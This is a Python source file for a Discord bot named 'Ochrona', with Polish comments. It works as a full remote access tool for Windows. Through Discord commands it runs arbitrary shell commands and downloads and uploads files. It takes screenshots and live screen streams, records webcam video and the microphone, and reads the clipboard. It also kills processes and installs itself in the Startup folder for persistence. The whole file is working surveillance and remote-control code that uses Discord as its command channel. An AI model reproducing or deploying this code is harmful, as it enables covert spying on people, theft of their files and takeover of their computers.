import os
import sys
import asyncio
import io
import wave
import tempfile
from datetime import datetime
from pathlib import Path

import discord
from discord.ext import commands
import pyautogui
import cv2
from PIL import Image, ImageGrab
import sounddevice as sd
import numpy as np
import pygame

# ==================== KONFIGURACJA ====================
TOKEN = "twój_token" # ← wklej NOWY token po resecie
OWNER_ID=twój_id                     
OWNER_ID =twój_id
CHANNEL_ID =channel_id
UPLOAD_FOLDER = Path(r"C:\Desktop")
# ======================================================

UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)

def is_owner():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(predicate)

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=2048)
sslive_task = None
selected_monitor = 0
selected_mic = None

def get_startup_folder():
    return Path(os.environ["APPDATA"]) / r"Microsoft\Windows\Start Menu\Programs\Startup"

def get_script_path():
    if getattr(sys, "frozen", False):
        return Path(sys.executable)
    return Path(__file__).resolve()

def is_autostart_enabled():
    startup = get_startup_folder()
    return (startup / "OchronaBot.bat").exists() or (startup / "OchronaBot.lnk").exists()

def press_key(vk):
    import ctypes
    ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
    ctypes.windll.user32.keybd_event(vk, 0, 2, 0)

@bot.event
async def on_ready():
    print(f"[+] Zalogowano jako {bot.user}")
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        try:
            embed = discord.Embed(
                title="✅ Bot Ochrona uruchomiony",
                description=f"**Komputer:** `{os.environ.get('COMPUTERNAME', '?')}`\n**Czas:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`",
                color=0x00ff88
            )
            await channel.send(embed=embed)
        except:
            pass

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("❌ Brak uprawnień.")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"❌ {type(error).__name__}: {error}")

async def send_long(ctx, text, filename="output.txt"):
    if len(text) < 1900:
        await ctx.send(f"```\n{text}\n```")
    else:
        await ctx.send(file=discord.File(io.BytesIO(text.encode("utf-8", errors="replace")), filename=filename))

@bot.command(name="help")
@is_owner()
async def help_cmd(ctx):
    embed = discord.Embed(
        title="🛡️ Ochrona Bot – Lista komend",
        description="Wszystkie komendy działają **tylko dla Ciebie**.",
        color=0x5865F2
    )
    embed.add_field(name="📌 Podstawowe", value="`.help` `.status` `.switch` `.switch 0/1`", inline=False)
    embed.add_field(name="💻 System", value="`.cmd` `.ls` `.download` `.upload` `.procs` `.windows` `.kill` `.clipboard`", inline=False)
    embed.add_field(name="👁️ Podgląd", value="`.ss` `.sslive on/off` `.webcam` `.camrec` `.mic` `.choosemic`", inline=False)
    embed.add_field(name="🔊 Dźwięk", value="`.soundplay` `.soundstop` `.volume` `.volup` `.voldown` `.mute`", inline=False)
    embed.add_field(name="⚡ Zasilanie", value="`.lock` `.shutdown` `.restart` `.battery`", inline=False)
    embed.add_field(name="🌐 Inne", value="`.open` `.notify` `.join` `.leave` `.autoon` `.autooff` `.autostatus` `.destroy`", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="status")
@is_owner()
async def status(ctx):
    try:
        import psutil
        boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M")
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage("C:\\")
        embed = discord.Embed(title="📊 Status", color=0x00ff88)
        embed.add_field(name="Host", value=f"`{os.environ.get('COMPUTERNAME')}`", inline=True)
        embed.add_field(name="CPU", value=f"**{cpu}%**", inline=True)
        embed.add_field(name="RAM", value=f"**{mem.percent}%**", inline=True)
        embed.add_field(name="Dysk", value=f"**{disk.percent}%**", inline=True)
        embed.add_field(name="Start", value=f"`{boot}`", inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="switch")
@is_owner()
async def switch_monitors(ctx, monitor_id: int = None):
    global selected_monitor
    try:
        from screeninfo import get_monitors as get_mons
        mons = list(get_mons())
    except Exception:
        mons = []
    if monitor_id is None:
        if not mons:
            size = pyautogui.size()
            await ctx.send(f"`0` → **Główny** {size[0]}x{size[1]}")
            return
        lines = [f"`{i}` → {m.width}x{m.height}{' (główny)' if m.is_primary else ''}" for i, m in enumerate(mons)]
        await ctx.send(embed=discord.Embed(title="🖥️ Monitory", description="\n".join(lines) + f"\n\nWybrany: **{selected_monitor}**", color=0x5865F2))
        return
    if not mons:
        if monitor_id == 0:
            selected_monitor = 0
            await ctx.send("✅ Monitor **0**")
        else:
            await ctx.send("❌ Tylko monitor `0`")
        return
    if monitor_id < 0 or monitor_id >= len(mons):
        await ctx.send(f"❌ Zły numer. 0–{len(mons)-1}")
        return
    selected_monitor = monitor_id
    await ctx.send(f"✅ Monitor **{monitor_id}**")

@bot.command(name="cmd", aliases=["exec"])
@is_owner()
async def run_command(ctx, *, command: str):
    await ctx.send(f"⏳ `{command}`")
    try:
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
        out = (stdout or b"").decode("utf-8", errors="replace")
        err = (stderr or b"").decode("utf-8", errors="replace")
        await send_long(ctx, f"Kod: {proc.returncode}\n{out}\n{err}")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="ls")
@is_owner()
async def list_dir(ctx, *, path: str = "."):
    try:
        path = path.strip().strip('"').strip("'").replace("/", "\\")
        p = Path(path)
        if not p.is_absolute():
            p = Path.cwd() / p
        p = p.resolve()
        if not p.exists():
            await ctx.send(f"❌ Nie istnieje:\n`{p}`")
            return
        if p.is_file():
            await ctx.send(f"📄 `{p.name}` ({p.stat().st_size/1024:.1f} KB)\n`{p}`")
            return
        entries = []
        for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
            if item.is_dir():
                entries.append(f"📁 `{item.name}`")
            else:
                entries.append(f"📄 `{item.name}` ({item.stat().st_size/1024:.1f} KB)")
        text = f"**{p}**\n" + "\n".join(entries[:60])
        await send_long(ctx, text, "listing.txt")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="download", aliases=["dl"])
@is_owner()
async def download_file(ctx, *, path: str):
    try:
        path = path.strip().strip('"').strip("'").replace("/", "\\")
        p = Path(path)
        if not p.is_absolute():
            p = Path.cwd() / p
        if not p.exists():
            await ctx.send(f"❌ Nie znaleziono:\n`{p}`\nUżyj `.ls` żeby sprawdzić ścieżkę.")
            return
        p = p.resolve()
        if not p.is_file():
            await ctx.send(f"❌ To folder, nie plik:\n`{p}`")
            return
        size = p.stat().st_size
        if size > 24 * 1024 * 1024:
            await ctx.send(f"❌ Za duży: **{size/1024/1024:.1f} MB** (limit ~24 MB)")
            return
        await ctx.send(f"⬇️ `{p.name}` ({size/1024:.1f} KB)…")
        await ctx.send(file=discord.File(str(p), filename=p.name))
    except PermissionError:
        await ctx.send("❌ Brak uprawnień.")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="upload")
@is_owner()
async def upload_file(ctx):
    if not ctx.message.attachments:
        await ctx.send("Dołącz plik")
        return
    for att in ctx.message.attachments:
        dest = UPLOAD_FOLDER / att.filename
        await att.save(dest)
        await ctx.send(f"✅ `{dest}`")

@bot.command(name="procs")
@is_owner()
async def processes(ctx):
    try:
        import psutil
        procs = sorted(
            [(p.info["memory_info"].rss // 1024**2, p.info["pid"], p.info["name"])
             for p in psutil.process_iter(["pid", "name", "memory_info"]) if p.info.get("memory_info")],
            reverse=True
        )[:12]
        lines = [f"`{pid}` **{name}** — {mem} MB" for mem, pid, name in procs]
        await ctx.send(embed=discord.Embed(title="📋 Procesy", description="\n".join(lines), color=0xffaa00))
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="windows")
@is_owner()
async def open_windows(ctx):
    try:
        import pygetwindow as gw
        wins = [w for w in gw.getAllTitles() if w.strip()][:20]
        await ctx.send(embed=discord.Embed(title="🪟 Okna", description="\n".join(f"• `{w[:45]}`" for w in wins) or "Brak", color=0x5865F2))
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="kill")
@is_owner()
async def kill_process(ctx, *, name: str):
    try:
        import psutil
        killed = 0
        for p in psutil.process_iter(["name"]):
            if name.lower() in (p.info["name"] or "").lower():
                p.kill()
                killed += 1
        await ctx.send(f"☠️ Zabito **{killed}** × `{name}`" if killed else f"Nie znaleziono `{name}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="clipboard")
@is_owner()
async def clipboard(ctx):
    try:
        import pyperclip
        text = pyperclip.paste()
        await ctx.send(f"📋 ```\n{(text or 'pusty')[:1400]}\n```")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="screenshot", aliases=["ss"])
@is_owner()
async def screenshot(ctx):
    await ctx.send("📸 …")
    try:
        try:
            from screeninfo import get_monitors as get_mons
            mons = list(get_mons())
        except Exception:
            mons = []
        if mons and 0 <= selected_monitor < len(mons):
            m = mons[selected_monitor]
            img = ImageGrab.grab(bbox=(m.x, m.y, m.x + m.width, m.y + m.height))
        else:
            img = pyautogui.screenshot()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        await ctx.send(file=discord.File(buf, filename=f"ss_{selected_monitor}.png"))
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="sslive")
@is_owner()
async def sslive(ctx, mode: str = "status"):
    global sslive_task
    mode = mode.lower()
    if mode == "on":
        if sslive_task and not sslive_task.done():
            await ctx.send("Już działa")
            return
        await ctx.send("✅ Ciągłe zrzuty włączone")
        async def loop():
            while True:
                try:
                    try:
                        from screeninfo import get_monitors as get_mons
                        mons = list(get_mons())
                    except Exception:
                        mons = []
                    if mons and 0 <= selected_monitor < len(mons):
                        m = mons[selected_monitor]
                        img = ImageGrab.grab(bbox=(m.x, m.y, m.x + m.width, m.y + m.height))
                    else:
                        img = pyautogui.screenshot()
                    buf = io.BytesIO()
                    img.save(buf, format="JPEG", quality=60)
                    buf.seek(0)
                    await ctx.send(file=discord.File(buf, "live.jpg"))
                except Exception as e:
                    print(e)
                await asyncio.sleep(3)
        sslive_task = bot.loop.create_task(loop())
    elif mode == "off":
        if sslive_task and not sslive_task.done():
            sslive_task.cancel()
            sslive_task = None
            await ctx.send("⏹️ Stop")
        else:
            await ctx.send("Nie było włączone")
    else:
        st = "🟢 ON" if (sslive_task and not sslive_task.done()) else "🔴 OFF"
        await ctx.send(f"Status: {st}")

@bot.command(name="webcam", aliases=["cam"])
@is_owner()
async def webcam(ctx):
    await ctx.send("📷 …")
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            await ctx.send("❌ Brak obrazu")
            return
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        img = Image.fromarray(frame)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=85)
        buf.seek(0)
        await ctx.send(file=discord.File(buf, "cam.jpg"))
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="choosemic")
@is_owner()
async def choose_mic(ctx, device_id: int = None):
    global selected_mic
    try:
        devices = sd.query_devices()
        input_devices = [(i, d["name"]) for i, d in enumerate(devices) if d["max_input_channels"] > 0]
        if not input_devices:
            await ctx.send("❌ Brak mikrofonów")
            return
        if device_id is None:
            lines = [f"`{i}` → **{name}**" for i, name in input_devices]
            current = f"\n\nWybrany: **{selected_mic}**" if selected_mic is not None else "\n\nWybrany: domyślny"
            await ctx.send(embed=discord.Embed(title="🎙️ Mikrofony", description="\n".join(lines) + current + "\n\n`.choosemic numer`", color=0x5865F2))
            return
        valid = [i for i, _ in input_devices]
        if device_id not in valid:
            await ctx.send(f"❌ Zły numer: {valid}")
            return
        selected_mic = device_id
        name = next(n for i, n in input_devices if i == device_id)
        await ctx.send(f"✅ Mikrofon **{device_id}**: `{name}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="camrec")
@is_owner()
async def camera_record(ctx, seconds: float = 5.0):
    seconds = max(2.0, min(seconds, 12.0))
    await ctx.send(f"🎥 {seconds}s…")
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            await ctx.send("❌ Brak kamerki")
            return
        w, h = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)), int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        fps = 15
        temp_path = Path(tempfile.gettempdir()) / f"camrec_{ctx.message.id}.avi"
        out = cv2.VideoWriter(str(temp_path), cv2.VideoWriter_fourcc(*"XVID"), fps, (w, h))
        for _ in range(int(seconds * fps)):
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
            await asyncio.sleep(1 / fps)
        cap.release()
        out.release()
        if temp_path.stat().st_size > 24 * 1024 * 1024:
            await ctx.send("❌ Za duży")
            temp_path.unlink(missing_ok=True)
            return
        await ctx.send(file=discord.File(str(temp_path), filename="camrec.avi"))
        temp_path.unlink(missing_ok=True)
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="mic")
@is_owner()
async def mic_record(ctx, seconds: float = 5.0):
    seconds = max(1.0, min(seconds, 15.0))
    await ctx.send(f"🎙️ {seconds}s…")
    try:
        kwargs = {"frames": int(seconds * 44100), "samplerate": 44100, "channels": 1, "dtype": "float32"}
        if selected_mic is not None:
            kwargs["device"] = selected_mic
        rec = sd.rec(**kwargs)
        sd.wait()
        audio = (rec * 32767).astype(np.int16)
        buf = io.BytesIO()
        with wave.open(buf, "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(44100)
            wf.writeframes(audio.tobytes())
        buf.seek(0)
        await ctx.send(file=discord.File(buf, "mic.wav"))
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="soundplay")
@is_owner()
async def soundplay(ctx, volume: float = 0.7):
    if not ctx.message.attachments:
        await ctx.send("❌ Dołącz MP3/WAV")
        return
    att = ctx.message.attachments[0]
    if not att.filename.lower().endswith((".mp3", ".wav", ".ogg")):
        await ctx.send("❌ Tylko mp3/wav/ogg")
        return
    volume = max(0.0, min(1.0, volume))
    try:
        temp = Path(tempfile.gettempdir()) / f"snd_{att.id}_{att.filename}"
        await att.save(str(temp))
        try:
            pygame.mixer.music.stop()
            pygame.mixer.music.unload()
        except:
            pass
        pygame.mixer.music.load(str(temp))
        pygame.mixer.music.set_volume(volume)
        pygame.mixer.music.play()
        await ctx.send(f"🔊 `{att.filename}` ({int(volume*100)}%)")
    except Exception as e:
        if "corrupt" in str(e).lower() or "bad stream" in str(e).lower():
            await ctx.send("❌ Zły MP3 – spróbuj WAV")
        else:
            await ctx.send(f"❌ {e}")

@bot.command(name="soundstop")
@is_owner()
async def soundstop(ctx):
    try:
        pygame.mixer.music.stop()
        await ctx.send("⏹️ Stop")
    except:
        await ctx.send("Nic nie gra")

# Dźwięk systemowy – działa w .exe (bez pycaw)
@bot.command(name="mute")
@is_owner()
async def mute(ctx):
    try:
        press_key(0xAD)  # VK_VOLUME_MUTE
        await ctx.send("🔇 Mute przełączony")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="unmute")
@is_owner()
async def unmute(ctx):
    try:
        press_key(0xAD)
        await ctx.send("🔊 Mute przełączony")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="volume")
@is_owner()
async def set_volume(ctx, level: int = None):
    try:
        if level is None:
            await ctx.send("`.volume 0-100`  |  `.volup`  |  `.voldown`  |  `.mute`")
            return
        level = max(0, min(100, level))
        for _ in range(50):
            press_key(0xAE)  # down
        for _ in range(int(level / 2)):
            press_key(0xAF)  # up
        await ctx.send(f"🔊 ok. **{level}%**")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="volup")
@is_owner()
async def vol_up(ctx, times: int = 5):
    times = max(1, min(times, 20))
    for _ in range(times):
        press_key(0xAF)
    await ctx.send(f"🔊 +{times}")

@bot.command(name="voldown")
@is_owner()
async def vol_down(ctx, times: int = 5):
    times = max(1, min(times, 20))
    for _ in range(times):
        press_key(0xAE)
    await ctx.send(f"🔉 -{times}")

@bot.command(name="lock")
@is_owner()
async def lock_pc(ctx):
    try:
        import ctypes
        ctypes.windll.user32.LockWorkStation()
        await ctx.send("🔒")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="shutdown")
@is_owner()
async def shutdown_pc(ctx):
    await ctx.send("⚠️ Wyłączenie za 10s")
    os.system("shutdown /s /t 10")

@bot.command(name="restart")
@is_owner()
async def restart_pc(ctx):
    await ctx.send("⚠️ Restart za 10s")
    os.system("shutdown /r /t 10")

@bot.command(name="battery")
@is_owner()
async def battery(ctx):
    try:
        import psutil
        bat = psutil.sensors_battery()
        if not bat:
            await ctx.send("Brak baterii")
            return
        st = "🔌" if bat.power_plugged else "🔋"
        await ctx.send(f"{st} **{bat.percent}%**")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="open")
@is_owner()
async def open_url(ctx, url: str):
    try:
        import webbrowser
        if not url.startswith("http"):
            url = "https://" + url
        webbrowser.open(url)
        await ctx.send(f"🌐 `{url}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="notify")
@is_owner()
async def notify(ctx, *, text: str):
    try:
        from win10toast import ToastNotifier
        ToastNotifier().show_toast("Ochrona", text, duration=5, threaded=True)
        await ctx.send(f"🔔 `{text}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="join")
@is_owner()
async def join_voice(ctx, *, channel_name: str = None):
    channels = ctx.guild.voice_channels
    if not channels:
        await ctx.send("Brak kanałów")
        return
    if channel_name is None:
        lista = "\n".join(f"`{i+1}.` **{c.name}**" for i, c in enumerate(channels))
        await ctx.send(f"**Kanały:**\n{lista}")
        return
    ch = discord.utils.find(lambda c: c.name.lower() == channel_name.lower(), channels)
    if not ch:
        await ctx.send("❌ Nie znaleziono")
        return
    try:
        if ctx.voice_client:
            await ctx.voice_client.move_to(ch)
        else:
            await ch.connect()
        await ctx.send(f"✅ **{ch.name}**")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="leave")
@is_owner()
async def leave_voice(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("👋")
    else:
        await ctx.send("Nie jestem na kanale")

@bot.command(name="micon")
@is_owner()
async def micon(ctx):
    await ctx.send("Używaj `.mic 5`")

@bot.command(name="micoff")
@is_owner()
async def micoff(ctx):
    await ctx.send("OK")

@bot.command(name="autoon")
@is_owner()
async def auto_on(ctx):
    try:
        startup = get_startup_folder()
        script = get_script_path()
        bat_path = startup / "OchronaBot.bat"
        if script.suffix.lower() == ".exe":
            content = f'@echo off\nstart "" "{script}"\n'
        else:
            pythonw = Path(sys.executable).with_name("pythonw.exe")
            if not pythonw.exists():
                pythonw = Path(sys.executable)
            content = f'@echo off\nstart "" "{pythonw}" "{script}"\n'
        bat_path.write_text(content, encoding="utf-8")
        await ctx.send(f"✅ Auto-start **włączony**\n`{bat_path}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="autooff")
@is_owner()
async def auto_off(ctx):
    try:
        startup = get_startup_folder()
        removed = False
        for name in ["OchronaBot.bat", "OchronaBot.lnk"]:
            p = startup / name
            if p.exists():
                p.unlink()
                removed = True
        await ctx.send("✅ Auto-start **wyłączony**" if removed else "Nie był włączony.")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name="autostatus")
@is_owner()
async def auto_status(ctx):
    await ctx.send("🟢 **WŁĄCZONY**" if is_autostart_enabled() else "🔴 **WYŁĄCZONY**")

@bot.command(name="destroy")
@is_owner()
async def destroy(ctx):
    await ctx.send("💥 Wyłączam…")
    await bot.close()
    os._exit(0)

if __name__ == "__main__":
    if not TOKEN or OWNER_ID == 0:
        print("Uzupełnij TOKEN i OWNER_ID!")
        sys.exit(1)
    print("[*] Start...")
    bot.run(TOKEN)
